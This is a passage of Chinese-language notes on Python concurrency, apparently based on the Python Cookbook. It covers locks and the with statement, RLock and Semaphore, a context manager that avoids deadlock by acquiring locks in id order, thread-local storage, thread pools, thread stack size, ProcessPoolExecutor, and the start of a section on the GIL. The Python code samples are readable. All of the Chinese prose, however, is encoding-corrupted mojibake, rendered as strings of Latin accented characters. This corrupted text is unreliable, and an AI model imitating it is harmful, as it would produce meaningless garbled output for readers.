éšæœºæ•°æ®æŸåæˆ–è€…å…¶ä»–çš„å¼‚å¸¸è¡Œä¸ºï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºç«äº‰æ¡ä»¶ã€‚ä¸ºäº†é¿å…ç«äº‰æ¡ä»¶ï¼Œæœ€å¥½åª åœ¨ä¸´ç•ŒåŒºï¼ˆå¯¹ä¸´ç•Œèµ„æºè¿›è¡Œæ“ä½œçš„é‚£éƒ¨åˆ†ä»£ç ï¼‰ä½¿ç”¨é”ã€‚åœ¨ä¸€äº›\"è€çš„\"Python ä»£ç  ä¸­ï¼Œæ˜¾å¼è·å–å’Œé‡Šæ”¾é”æ˜¯å¾ˆå¸¸è§çš„: self._value_lock = threading.Lock() self._value_lock.acquire() self._value += delta self._value_lock.release() ç›¸æ¯”äºè¿™ç§æ˜¾å¼è°ƒç”¨çš„æ–¹æ³•ï¼Œwith è¯­å¥æ›´åŠ ä¼˜é›…ï¼Œä¹Ÿæ›´ä¸å®¹æ˜“å‡ºé”™ï¼Œç‰¹åˆ«æ˜¯ç¨‹åºå‘˜ å¯èƒ½ä¼šå¿˜è®°è°ƒç”¨ release() æ–¹æ³•æˆ–è€…ç¨‹åºåœ¨è·å¾—é”ä¹‹åäº§ç”Ÿå¼‚å¸¸è¿™ä¸¤ç§æƒ…å†µï¼ˆä½¿ç”¨ with è¯­å¥å¯ä»¥ä¿è¯åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ä»èƒ½æ­£ç¡®é‡Šæ”¾é”ï¼‰ã€‚ ä¸ºäº†é¿å…å‡ºç°æ­»é”çš„æƒ…å†µï¼Œä½¿ç”¨é”æœº åˆ¶çš„ç¨‹åºåº”è¯¥è®¾å®šä¸ºæ¯ä¸ªçº¿ç¨‹ä¸€æ¬¡åªå…è®¸è·å–ä¸€ä¸ªé”ã€‚å¦‚æœä¸èƒ½è¿™æ ·åšçš„è¯ï¼Œä½ å°±éœ€ è¦æ›´é«˜çº§çš„æ­»é”é¿å…æœºåˆ¶. åœ¨ threading åº“ä¸­è¿˜æä¾›äº†å…¶ä»–çš„ åŒæ­¥åŸè¯­ï¼Œæ¯”å¦‚ RLock å’Œ Semaphore å¯¹è±¡ã€‚ä½†æ˜¯æ ¹æ®ä»¥å¾€ç»éªŒï¼Œè¿™äº›åŸè¯­æ˜¯ç”¨äºä¸€äº› ç‰¹æ®Šçš„æƒ…å†µï¼Œå¦‚æœä½ åªæ˜¯éœ€è¦ç®€å•åœ°å¯¹å¯å˜å¯¹è±¡è¿›è¡Œé”å®šï¼Œé‚£å°±ä¸åº”è¯¥ä½¿ç”¨å®ƒä»¬ã€‚ä¸€ä¸ª RLock ï¼ˆå¯é‡å…¥é”ï¼‰å¯ä»¥è¢«åŒä¸€ä¸ªçº¿ç¨‹å¤šæ¬¡è·å–ï¼Œä¸»è¦ç”¨æ¥å®ç°åŸºäºç›‘æµ‹å¯¹è±¡æ¨¡å¼çš„é” å®šå’ŒåŒæ­¥ã€‚åœ¨ä½¿ç”¨è¿™ç§é”çš„æƒ…å†µä¸‹ï¼Œå½“é”è¢«æŒæœ‰æ—¶ï¼Œåªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥ä½¿ç”¨å®Œæ•´çš„å‡½æ•° æˆ–è€…ç±»ä¸­çš„æ–¹æ³•ã€‚ ä¸€ä¸ªç±»çº§RLOCKé”å¯ä»¥ä¿è¯ä¸€æ¬¡ åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥è°ƒç”¨è¿™ä¸ªç±»æ–¹æ³•ã€‚ä¸è¿‡ï¼Œä¸ä¸€ä¸ªæ ‡å‡†çš„é”ä¸åŒçš„æ˜¯ï¼Œå·²ç»æŒæœ‰è¿™ä¸ªé” çš„æ–¹æ³•åœ¨è°ƒç”¨åŒæ ·ä½¿ç”¨è¿™ä¸ªé”çš„æ–¹æ³•æ—¶ï¼Œæ— éœ€å†æ¬¡è·å–é”ã€‚(ä¸ä»¥å‰çœ‹åˆ°çš„å¥½åƒæœ‰ç‚¹ä¸ä¸€æ ·, ä»¥å‰çš„ç†è§£æ˜¯æ¯æ¬¡é€’å½’éƒ½ä¼šåŠ ä¸€æ¬¡é”, åŠ äº†å¤šå°‘æ¬¡å°±éœ€è¦é‡Šæ”¾å¤šå°‘æ¬¡) å°½ç®¡ä½ å¯ä»¥åœ¨ç¨‹åºä¸­åƒæ ‡å‡†é”ä¸€æ ·ä½¿ç”¨ä¿¡å·é‡æ¥åšçº¿ç¨‹åŒæ­¥ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼å¹¶ä¸è¢« æ¨èï¼Œå› ä¸ºä½¿ç”¨ä¿¡å·é‡ä¸ºç¨‹åºå¢åŠ çš„å¤æ‚æ€§ä¼šå½±å“ç¨‹åºæ€§èƒ½ã€‚ç›¸å¯¹äºç®€å•åœ°ä½œä¸ºé”ä½¿ ç”¨ï¼Œä¿¡å·é‡æ›´é€‚ç”¨äºé‚£äº›éœ€è¦åœ¨çº¿ç¨‹ä¹‹é—´å¼•å…¥ä¿¡å·æˆ–è€…é™åˆ¶çš„ç¨‹åºã€‚æ¯”å¦‚ï¼Œä½ éœ€è¦é™åˆ¶ ä¸€æ®µä»£ç çš„å¹¶å‘è®¿é—®é‡ é˜²æ­¢æ­»é”çš„åŠ é”æœºåˆ¶ é—®é¢˜ ä½ æ­£åœ¨å†™ä¸€ä¸ªå¤šçº¿ç¨‹ç¨‹åºï¼Œå…¶ä¸­çº¿ç¨‹éœ€è¦ä¸€æ¬¡è·å–å¤šä¸ªé”ï¼Œæ­¤æ—¶å¦‚ä½•é¿å…æ­»é”é—® é¢˜ã€‚ è§£å†³æ–¹æ¡ˆ åœ¨å¤šçº¿ç¨‹ç¨‹åºä¸­ï¼Œæ­»é”é—®é¢˜å¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯ç”±äºçº¿ç¨‹åŒæ—¶è·å–å¤šä¸ªé”é€ æˆçš„ã€‚ä¸¾ä¸ªä¾‹ å­ï¼šä¸€ä¸ªçº¿ç¨‹è·å–äº†ç¬¬ä¸€ä¸ªé”ï¼Œç„¶ååœ¨è·å–ç¬¬äºŒä¸ªé”çš„æ—¶å€™å‘ç”Ÿé˜»å¡ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å°± å¯èƒ½é˜»å¡å…¶ä»–çº¿ç¨‹çš„æ‰§è¡Œï¼Œä»è€Œå¯¼è‡´æ•´ä¸ªç¨‹åºå‡æ­»ã€‚è§£å†³æ­»é”é—®é¢˜çš„ä¸€ç§æ–¹æ¡ˆæ˜¯ä¸ºç¨‹åº ä¸­çš„æ¯ä¸€ä¸ªé”åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ idï¼Œç„¶ååªå…è®¸æŒ‰ç…§å‡åºè§„åˆ™æ¥ä½¿ç”¨å¤šä¸ªé”ï¼Œè¿™ä¸ªè§„åˆ™ ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨æ˜¯éå¸¸å®¹æ˜“å®ç°çš„: import threading from contextlib import contextmanager # Thread-local state to stored information on locks already acquired _local = threading.local() @contextmanager def acquire(*locks): # Sort locks by object identifier locks = sorted(locks, key=lambda x: id(x)) # Make sure lock order of previously acquired locks is not violated acquired = getattr(_local,'acquired',[]) if acquired and max(id(lock) for lock in acquired) >= id(locks[0]): raise RuntimeError('Lock Order Violation') # Acquire all of the locks acquired.extend(locks) _local.acquired = acquired try: for lock in locks: lock.acquire() yield finally: # Release locks in reverse order of acquisition for lock in reversed(locks): lock.release() del acquired[-len(locks):] å¦‚ä½•ä½¿ç”¨è¿™ä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨å‘¢ï¼Ÿä½ å¯ä»¥æŒ‰ç…§æ­£å¸¸é€”å¾„åˆ›å»ºä¸€ä¸ªé”å¯¹è±¡ï¼Œä½†ä¸è®ºæ˜¯ å•ä¸ªé”è¿˜æ˜¯å¤šä¸ªé”ä¸­éƒ½ä½¿ç”¨ acquire() å‡½æ•°æ¥ç”³è¯·é”ï¼Œç¤ºä¾‹å¦‚ä¸‹: import threading x_lock = threading.Lock() y_lock = threading.Lock() def thread_1(): while True: with acquire(x_lock, y_lock): print('Thread-1') def thread_2(): while True: with acquire(y_lock, x_lock): print('Thread-2') t1 = threading.Thread(target=thread_1) t1.daemon = True t1.start() t2 = threading.Thread(target=thread_2) t2.daemon = True t2.start() å¦‚æœä½ æ‰§è¡Œè¿™æ®µä»£ç ï¼Œä½ ä¼šå‘ç°å®ƒå³ä½¿åœ¨ä¸åŒçš„å‡½æ•°ä¸­ä»¥ä¸åŒçš„é¡ºåºè·å–é”ä¹Ÿæ²¡ æœ‰å‘ç”Ÿæ­»é”ã€‚å…¶å…³é”®åœ¨äºï¼Œåœ¨ç¬¬ä¸€æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯¹è¿™äº›é”è¿›è¡Œäº†æ’åºã€‚é€šè¿‡æ’åºï¼Œä½¿ å¾—ä¸ç®¡ç”¨æˆ·ä»¥ä»€ä¹ˆæ ·çš„é¡ºåºæ¥è¯·æ±‚é”ï¼Œè¿™äº›é”éƒ½ä¼šæŒ‰ç…§å›ºå®šçš„é¡ºåºè¢«è·å–ã€‚å¦‚æœæœ‰å¤šä¸ª acquire() æ“ä½œè¢«åµŒå¥—è°ƒç”¨ï¼Œå¯ä»¥é€šè¿‡çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼ˆTLSï¼‰æ¥æ£€æµ‹æ½œåœ¨çš„æ­»é”é—®é¢˜ã€‚ è®¨è®º æ­»é”æ˜¯æ¯ä¸€ä¸ªå¤šçº¿ç¨‹ç¨‹åºéƒ½ä¼šé¢ä¸´çš„ä¸€ä¸ªé—®é¢˜ï¼ˆå°±åƒå®ƒæ˜¯æ¯ä¸€æœ¬æ“ä½œç³»ç»Ÿè¯¾æœ¬çš„ å…±åŒè¯é¢˜ä¸€æ ·ï¼‰ã€‚æ ¹æ®ç»éªŒæ¥è®²ï¼Œå°½å¯èƒ½ä¿è¯æ¯ä¸€ä¸ªçº¿ç¨‹åªèƒ½åŒæ—¶ä¿æŒä¸€ä¸ªé”ï¼Œè¿™æ ·ç¨‹ åºå°±ä¸ä¼šè¢«æ­»é”é—®é¢˜æ‰€å›°æ‰°ã€‚ä¸€æ—¦æœ‰çº¿ç¨‹åŒæ—¶ç”³è¯·å¤šä¸ªé”ï¼Œä¸€åˆ‡å°±ä¸å¯é¢„æ–™äº†ã€‚ æ­»é”çš„æ£€æµ‹ä¸æ¢å¤æ˜¯ä¸€ä¸ªå‡ ä¹æ²¡æœ‰ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆçš„æ‰©å±•è¯é¢˜ã€‚ä¸€ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„ æ­»é”æ£€æµ‹ä¸æ¢å¤çš„æ–¹æ¡ˆæ˜¯å¼•å…¥çœ‹é—¨ç‹—è®¡æ•°å™¨ã€‚å½“çº¿ç¨‹æ­£å¸¸è¿è¡Œçš„æ—¶å€™ä¼šæ¯éš”ä¸€æ®µæ—¶é—´ é‡ç½®è®¡æ•°å™¨ï¼Œåœ¨æ²¡æœ‰å‘ç”Ÿæ­»é”çš„æƒ…å†µä¸‹ï¼Œä¸€åˆ‡éƒ½æ­£å¸¸è¿›è¡Œã€‚ä¸€æ—¦å‘ç”Ÿæ­»é”ï¼Œç”±äºæ— æ³•é‡ ç½®è®¡æ•°å™¨å¯¼è‡´å®šæ—¶å™¨è¶…æ—¶ï¼Œè¿™æ—¶ç¨‹åºä¼šé€šè¿‡é‡å¯è‡ªèº«æ¢å¤åˆ°æ­£å¸¸çŠ¶æ€ã€‚ é¿å…æ­»é”æ˜¯å¦å¤–ä¸€ç§è§£å†³æ­»é”é—®é¢˜çš„æ–¹å¼ï¼Œåœ¨è¿›ç¨‹è·å–é”çš„æ—¶å€™ä¼šä¸¥æ ¼æŒ‰ç…§å¯¹è±¡ id å‡åºæ’åˆ—è·å–ï¼Œç»è¿‡æ•°å­¦è¯æ˜ï¼Œè¿™æ ·ä¿è¯ç¨‹åºä¸ä¼šè¿›å…¥æ­»é”çŠ¶æ€ã€‚ é¿å…æ­»é”çš„ä¸»è¦æ€æƒ³æ˜¯ï¼Œå•çº¯åœ°æŒ‰ç…§å¯¹è±¡ id é€’å¢çš„é¡ºåºåŠ é”ä¸ä¼šäº§ç”Ÿå¾ªç¯ ä¾èµ–ï¼Œè€Œå¾ªç¯ä¾èµ–æ˜¯æ­»é”çš„ä¸€ä¸ªå¿…è¦æ¡ä»¶ï¼Œä»è€Œé¿å…ç¨‹åºè¿›å…¥æ­»é”çŠ¶æ€ã€‚ ä¿å­˜çº¿ç¨‹çš„çŠ¶æ€ä¿¡æ¯ é—®é¢˜ ä½ éœ€è¦ä¿å­˜æ­£åœ¨è¿è¡Œçº¿ç¨‹çš„çŠ¶æ€ï¼Œè¿™ä¸ªçŠ¶æ€å¯¹äºå…¶ä»–çš„çº¿ç¨‹æ˜¯ä¸å¯è§çš„ã€‚ è§£å†³æ–¹æ¡ˆ æœ‰æ—¶åœ¨å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­ï¼Œä½ éœ€è¦åªä¿å­˜å½“å‰è¿è¡Œçº¿ç¨‹çš„çŠ¶æ€ã€‚è¦è¿™ä¹ˆåšï¼Œå¯ä½¿ç”¨ thread.local() åˆ›å»ºä¸€ä¸ªæœ¬åœ°çº¿ç¨‹å­˜å‚¨å¯¹è±¡ã€‚å¯¹è¿™ä¸ªå¯¹è±¡çš„å±æ€§çš„ä¿å­˜å’Œè¯»å–æ“ä½œéƒ½ åªä¼šå¯¹æ‰§è¡Œçº¿ç¨‹å¯è§ï¼Œè€Œå…¶ä»–çº¿ç¨‹å¹¶ä¸å¯è§ã€‚ è®¨è®º åœ¨å¤§éƒ¨åˆ†ç¨‹åºä¸­åˆ›å»ºå’Œæ“ä½œçº¿ç¨‹ç‰¹å®šçŠ¶æ€å¹¶ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ã€‚ä¸è¿‡ï¼Œå½“å‡ºäº†é—®é¢˜çš„ æ—¶å€™ï¼Œé€šå¸¸æ˜¯å› ä¸ºæŸä¸ªå¯¹è±¡è¢«å¤šä¸ªçº¿ç¨‹ä½¿ç”¨åˆ°ï¼Œç”¨æ¥æ“ä½œä¸€äº›ä¸“ç”¨çš„ç³»ç»Ÿèµ„æºï¼Œæ¯”å¦‚ä¸€ ä¸ªå¥—æ¥å­—æˆ–æ–‡ä»¶ã€‚ä½ ä¸èƒ½è®©æ‰€æœ‰çº¿ç¨‹è´¡çŒ®ä¸€ä¸ªå•ç‹¬å¯¹è±¡ï¼Œå› ä¸ºå¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å’Œå†™çš„æ—¶ å€™ä¼šäº§ç”Ÿæ··ä¹±ã€‚æœ¬åœ°çº¿ç¨‹å­˜å‚¨é€šè¿‡è®©è¿™äº›èµ„æºåªèƒ½åœ¨è¢«ä½¿ç”¨çš„çº¿ç¨‹ä¸­å¯è§æ¥è§£å†³è¿™ä¸ª é—®é¢˜ã€‚ æ¯ä¸ª threading.local() å®ä¾‹ä¸ºæ¯ä¸ªçº¿ç¨‹ç»´æŠ¤ç€ä¸€ä¸ªå•ç‹¬çš„å®ä¾‹å­—å…¸ã€‚ æ‰€æœ‰æ™®é€šå®ä¾‹æ“ä½œæ¯”å¦‚è·å–ã€ä¿®æ”¹å’Œåˆ é™¤å€¼ä»…ä»…æ“ä½œè¿™ä¸ªå­—å…¸ã€‚æ¯ä¸ªçº¿ç¨‹ä½¿ç”¨ä¸€ä¸ªç‹¬ç«‹ çš„å­—å…¸å°±å¯ä»¥ä¿è¯æ•°æ®çš„éš”ç¦»äº† åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ±  é—®é¢˜ ä½ åˆ›å»ºä¸€ä¸ªå·¥ä½œè€…çº¿ç¨‹æ± ï¼Œç”¨æ¥ç›¸åº”å®¢æˆ·ç«¯è¯·æ±‚æˆ–æ‰§è¡Œå…¶ä»–çš„å·¥ä½œã€‚ è§£å†³æ–¹æ¡ˆ concurrent.futures å‡½æ•°åº“æœ‰ä¸€ä¸ª ThreadPoolExecutor ç±»å¯ä»¥è¢«ç”¨æ¥å®Œæˆè¿™ä¸ª ä»»åŠ¡ã€‚ å¦‚æœä½ æƒ³æ‰‹åŠ¨åˆ›å»ºä½ è‡ªå·±çš„çº¿ç¨‹æ± ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨ä¸€ä¸ª Queue æ¥è½»æ¾å®ç°. ä½†ä½¿ç”¨ ThreadPoolExecutor ç›¸å¯¹äºæ‰‹åŠ¨å®ç°çš„ä¸€ä¸ªå¥½å¤„åœ¨äºå®ƒä½¿å¾—ä»»åŠ¡æäº¤è€…æ›´ æ–¹ä¾¿çš„ä»è¢«è°ƒç”¨å‡½æ•°ä¸­è·å–è¿”å›å€¼ã€‚ æ³¨æ„a.result() æ“ä½œä¼šé˜»å¡è¿›ç¨‹ç›´åˆ°å¯¹åº”çš„å‡½æ•°æ‰§è¡Œå®Œæˆå¹¶è¿”å›ä¸€ä¸ªç»“æœã€‚ è®¨è®º é€šå¸¸æ¥è®²ï¼Œä½ åº”è¯¥é¿å…ç¼–å†™çº¿ç¨‹æ•°é‡å¯ä»¥æ— é™åˆ¶å¢é•¿çš„ç¨‹åº. ä»¥æŠµå¾¡æœ‰äººè¯•å›¾é€šè¿‡åˆ›å»ºå¤§é‡çº¿ç¨‹è®©ä½ æœåŠ¡å™¨èµ„ æºæ¯ç«­è€Œå´©æºƒçš„æ”»å‡»è¡Œä¸ºã€‚é€šè¿‡ä½¿ç”¨é¢„å…ˆåˆå§‹åŒ–çš„çº¿ç¨‹æ± ï¼Œä½ å¯ä»¥è®¾ç½®åŒæ—¶è¿è¡Œçº¿ç¨‹çš„ ä¸Šé™æ•°é‡ã€‚ ä½ å¯èƒ½ä¼šå…³å¿ƒåˆ›å»ºå¤§é‡çº¿ç¨‹ä¼šæœ‰ä»€ä¹ˆåæœã€‚ç°ä»£æ“ä½œç³»ç»Ÿå¯ä»¥å¾ˆè½»æ¾çš„åˆ›å»ºå‡ åƒ ä¸ªçº¿ç¨‹çš„çº¿ç¨‹æ± ã€‚ç”šè‡³ï¼ŒåŒæ—¶å‡ åƒä¸ªçº¿ç¨‹ç­‰å¾…å·¥ä½œå¹¶ä¸ä¼šå¯¹å…¶ä»–ä»£ç äº§ç”Ÿæ€§èƒ½å½±å“ã€‚å½“ ç„¶äº†ï¼Œå¦‚æœæ‰€æœ‰çº¿ç¨‹åŒæ—¶è¢«å”¤é†’å¹¶ç«‹å³åœ¨ CPU ä¸Šæ‰§è¡Œï¼Œé‚£å°±ä¸åŒäº†â€”â€”ç‰¹åˆ«æ˜¯æœ‰äº†å…¨ å±€è§£é‡Šå™¨é” GILã€‚é€šå¸¸ï¼Œä½ åº”è¯¥åªåœ¨ I/O å¤„ç†ç›¸å…³ä»£ç ä¸­ä½¿ç”¨çº¿ç¨‹æ± ã€‚ åˆ›å»ºå¤§çš„çº¿ç¨‹æ± çš„ä¸€ä¸ªå¯èƒ½éœ€è¦å…³æ³¨çš„é—®é¢˜æ˜¯å†…å­˜çš„ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ OS X ç³»ç»Ÿä¸Šé¢åˆ›å»º 2000 ä¸ªçº¿ç¨‹ï¼Œç³»ç»Ÿæ˜¾ç¤º Python è¿›ç¨‹ä½¿ç”¨äº†è¶…è¿‡ 9GB çš„è™šæ‹Ÿå†…å­˜ã€‚ä¸ è¿‡ï¼Œè¿™ä¸ªè®¡ç®—é€šå¸¸æ˜¯æœ‰è¯¯å·®çš„ã€‚å½“åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šé¢„ç•™ä¸€ä¸ªè™šæ‹Ÿå†…å­˜åŒºåŸŸ æ¥æ”¾ç½®çº¿ç¨‹çš„æ‰§è¡Œæ ˆï¼ˆé€šå¸¸æ˜¯ 8MB å¤§å°ï¼‰ã€‚ä½†æ˜¯è¿™ä¸ªå†…å­˜åªæœ‰ä¸€å°ç‰‡æ®µè¢«å®é™…æ˜ å°„åˆ° çœŸå®å†…å­˜ä¸­ã€‚å› æ­¤ï¼ŒPython è¿›ç¨‹ä½¿ç”¨åˆ°çš„çœŸå®å†…å­˜å…¶å®å¾ˆå°ï¼ˆæ¯”å¦‚ï¼Œå¯¹äº 2000 ä¸ªçº¿ç¨‹ æ¥è®²ï¼Œåªä½¿ç”¨åˆ°äº† 70MB çš„çœŸå®å†…å­˜ï¼Œè€Œä¸æ˜¯ 9GBï¼‰ã€‚å¦‚æœä½ æ‹…å¿ƒè™šæ‹Ÿå†…å­˜å¤§å°ï¼Œå¯ä»¥ ä½¿ç”¨ threading.stack_size() å‡½æ•°æ¥é™ä½å®ƒ: import threading threading.stack_size(65536) å¦‚æœä½ åŠ ä¸Šè¿™æ¡è¯­å¥å¹¶å†æ¬¡è¿è¡Œå‰é¢çš„åˆ›å»º 2000 ä¸ªçº¿ç¨‹è¯•éªŒï¼Œä½ ä¼šå‘ç° Python è¿›ç¨‹åªä½¿ç”¨åˆ°äº†å¤§æ¦‚ 210MB çš„è™šæ‹Ÿå†…å­˜ï¼Œè€ŒçœŸå®å†…å­˜ä½¿ç”¨é‡æ²¡æœ‰å˜ã€‚æ³¨æ„çº¿ç¨‹æ ˆå¤§å° å¿…é¡»è‡³å°‘ä¸º 32768 å­—èŠ‚ï¼Œé€šå¸¸æ˜¯ç³»ç»Ÿå†…å­˜é¡µå¤§å°ï¼ˆ4096ã€8192 ç­‰ï¼‰çš„æ•´æ•°å€ã€‚ ç®€å•çš„å¹¶è¡Œç¼–ç¨‹ é—®é¢˜ ä½ æœ‰ä¸ªç¨‹åºè¦æ‰§è¡Œ CPU å¯†é›†å‹å·¥ä½œï¼Œä½ æƒ³è®©ä»–åˆ©ç”¨å¤šæ ¸ CPU çš„ä¼˜åŠ¿æ¥è¿è¡Œçš„å¿« ä¸€ç‚¹ã€‚ è§£å†³æ–¹æ¡ˆ concurrent.futures åº“æä¾›äº†ä¸€ä¸ª ProcessPoolExecutor ç±»ï¼Œå¯è¢«ç”¨æ¥åœ¨ä¸€ä¸ªå• ç‹¬çš„ Python è§£é‡Šå™¨ä¸­æ‰§è¡Œè®¡ç®—å¯†é›†å‹å‡½æ•°ã€‚ä¸è¿‡ï¼Œè¦ä½¿ç”¨å®ƒï¼Œä½ é¦–å…ˆè¦æœ‰ä¸€äº›è®¡ç®—å¯† é›†å‹çš„ä»»åŠ¡ã€‚ è®¨è®º ProcessPoolExecutor çš„å…¸å‹ç”¨æ³•å¦‚ä¸‹: from concurrent.futures import ProcessPoolExecutor with ProcessPoolExecutor() as pool: ... do work in parallel using pool ... å…¶åŸç†æ˜¯ï¼Œä¸€ä¸ª ProcessPoolExecutor åˆ›å»º N ä¸ªç‹¬ç«‹çš„ Python è§£é‡Šå™¨ï¼ŒN æ˜¯ç³» ç»Ÿä¸Šé¢å¯ç”¨ CPU çš„ä¸ªæ•°ã€‚ä½ å¯ä»¥é€šè¿‡æä¾›å¯é€‰å‚æ•°ç»™ ProcessPoolExecutor(N) æ¥ä¿® æ”¹å¤„ç†å™¨æ•°é‡ã€‚è¿™ä¸ªå¤„ç†æ± ä¼šä¸€ç›´è¿è¡Œåˆ° with å—ä¸­æœ€åä¸€ä¸ªè¯­å¥æ‰§è¡Œå®Œæˆï¼Œç„¶åå¤„ç† æ± è¢«å…³é—­ã€‚ä¸è¿‡ï¼Œç¨‹åºä¼šä¸€ç›´ç­‰å¾…ç›´åˆ°æ‰€æœ‰æäº¤çš„å·¥ä½œè¢«å¤„ç†å®Œæˆã€‚ è¢«æäº¤åˆ°æ± ä¸­çš„å·¥ä½œå¿…é¡»è¢«å®šä¹‰ä¸ºä¸€ä¸ªå‡½æ•°ã€‚æœ‰ä¸¤ç§æ–¹æ³•å»æäº¤ã€‚å¦‚æœä½ æƒ³è®©ä¸€ä¸ª åˆ—è¡¨æ¨å¯¼æˆ–ä¸€ä¸ª map() æ“ä½œå¹¶è¡Œæ‰§è¡Œçš„è¯ï¼Œå¯ä½¿ç”¨ pool.map() å¦å¤–ï¼Œä½ å¯ä»¥ä½¿ç”¨ pool.submit() æ¥æ‰‹åŠ¨çš„æäº¤å•ä¸ªä»»åŠ¡ å¦‚æœä½ æ‰‹åŠ¨æäº¤ä¸€ä¸ªä»»åŠ¡ï¼Œç»“æœæ˜¯ä¸€ä¸ª Future å®ä¾‹ã€‚è¦è·å–æœ€ç»ˆç»“æœï¼Œä½ éœ€è¦è°ƒ ç”¨å®ƒçš„ result() æ–¹æ³•ã€‚å®ƒä¼šé˜»å¡è¿›ç¨‹ç›´åˆ°ç»“æœè¢«è¿”å›æ¥ã€‚ å¦‚æœä¸æƒ³é˜»å¡ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå›è°ƒå‡½æ•°: def when_done(r): print('Got:', r.result()) future_result = pool.submit(work, arg) future_result.add_done_callback(when_done) å›è°ƒå‡½æ•°æ¥å—ä¸€ä¸ª Future å®ä¾‹ï¼Œè¢«ç”¨æ¥è·å–æœ€ç»ˆçš„ç»“æœï¼ˆæ¯”å¦‚é€šè¿‡è°ƒç”¨å®ƒçš„ result() æ–¹æ³•ï¼‰ã€‚å°½ç®¡å¤„ç†æ± å¾ˆå®¹æ˜“ä½¿ç”¨ï¼Œåœ¨è®¾è®¡å¤§ç¨‹åºçš„æ—¶å€™è¿˜æ˜¯æœ‰å¾ˆå¤šéœ€è¦æ³¨æ„çš„ åœ°æ–¹ï¼Œå¦‚ä¸‹å‡ ç‚¹ï¼š Â· è¿™ç§å¹¶è¡Œå¤„ç†æŠ€æœ¯åªé€‚ç”¨äºé‚£äº›å¯ä»¥è¢«åˆ†è§£ä¸ºäº’ç›¸ç‹¬ç«‹éƒ¨åˆ†çš„é—®é¢˜ã€‚ Â· è¢«æäº¤çš„ä»»åŠ¡å¿…é¡»æ˜¯ç®€å•å‡½æ•°å½¢å¼ã€‚å¯¹äºæ–¹æ³•ã€é—­åŒ…å’Œå…¶ä»–ç±»å‹çš„å¹¶è¡Œæ‰§è¡Œè¿˜ä¸ æ”¯æŒã€‚ Â· å‡½æ•°å‚æ•°å’Œè¿”å›å€¼å¿…é¡»å…¼å®¹ pickleï¼Œå› ä¸ºè¦ä½¿ç”¨åˆ°è¿›ç¨‹é—´çš„é€šä¿¡ï¼Œæ‰€æœ‰è§£é‡Šå™¨ä¹‹ é—´çš„äº¤æ¢æ•°æ®å¿…é¡»è¢«åºåˆ—åŒ– Â· è¢«æäº¤çš„ä»»åŠ¡å‡½æ•°ä¸åº”ä¿ç•™çŠ¶æ€æˆ–æœ‰å‰¯ä½œç”¨ã€‚é™¤äº†æ‰“å°æ—¥å¿—ä¹‹ç±»ç®€å•çš„äº‹æƒ…ï¼Œ ä¸€æ—¦å¯åŠ¨ä½ ä¸èƒ½æ§åˆ¶å­è¿›ç¨‹çš„ä»»ä½•è¡Œä¸ºï¼Œå› æ­¤æœ€å¥½ä¿æŒç®€å•å’Œçº¯æ´â€”â€”å‡½æ•°ä¸è¦ å»ä¿®æ”¹ç¯å¢ƒã€‚ åœ¨ Unix ä¸Šè¿›ç¨‹æ± é€šè¿‡è°ƒç”¨ fork() ç³»ç»Ÿè°ƒç”¨è¢«åˆ›å»ºï¼Œ å®ƒä¼šå…‹éš† Python è§£é‡Šå™¨ï¼ŒåŒ…æ‹¬ fork æ—¶çš„æ‰€æœ‰ç¨‹åºçŠ¶æ€ã€‚è€Œåœ¨ Windows ä¸Šï¼Œå…‹éš†è§£ é‡Šå™¨æ—¶ä¸ä¼šå…‹éš†çŠ¶æ€ã€‚å®é™…çš„ fork æ“ä½œä¼šåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨ pool.map() æˆ– pool.submit() åå‘ç”Ÿã€‚ å½“ä½ æ··åˆä½¿ç”¨è¿›ç¨‹æ± å’Œå¤šçº¿ç¨‹çš„æ—¶å€™è¦ç‰¹åˆ«å°å¿ƒã€‚ ä½ åº”è¯¥åœ¨åˆ›å»ºä»»ä½•çº¿ç¨‹ä¹‹å‰å…ˆåˆ›å»ºå¹¶æ¿€æ´»è¿›ç¨‹æ± ï¼ˆæ¯”å¦‚åœ¨ç¨‹åºå¯åŠ¨çš„ main çº¿ç¨‹ä¸­ åˆ›å»ºè¿›ç¨‹æ± ï¼‰ã€‚ Python çš„å…¨å±€é”é—®é¢˜ é—®é¢˜ ä½ å·²ç»å¬è¯´è¿‡å…¨å±€è§£é‡Šå™¨é” GILï¼Œæ‹…å¿ƒå®ƒä¼šå½±å“åˆ°å¤šçº¿ç¨‹ç¨‹åºçš„æ‰§è¡Œæ€§èƒ½ã€‚ è§£å†³æ–¹æ¡ˆ å°½ç®¡ Python å®Œå…¨æ”¯æŒå¤šçº¿ç¨‹ç¼–ç¨‹ï¼Œä½†æ˜¯è§£é‡Šå™¨çš„ C è¯­è¨€å®ç°éƒ¨åˆ†åœ¨å®Œå…¨å¹¶è¡Œæ‰§ è¡Œæ—¶å¹¶ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚å®é™…ä¸Šï¼Œè§£é‡Šå™¨è¢«ä¸€ä¸ªå…¨å±€è§£é‡Šå™¨é”ä¿æŠ¤ç€ï¼Œå®ƒç¡®ä¿ä»»ä½•æ—¶å€™ éƒ½åªæœ‰ä¸€ä¸ª Python çº¿ç¨‹æ‰§è¡Œã€‚GIL 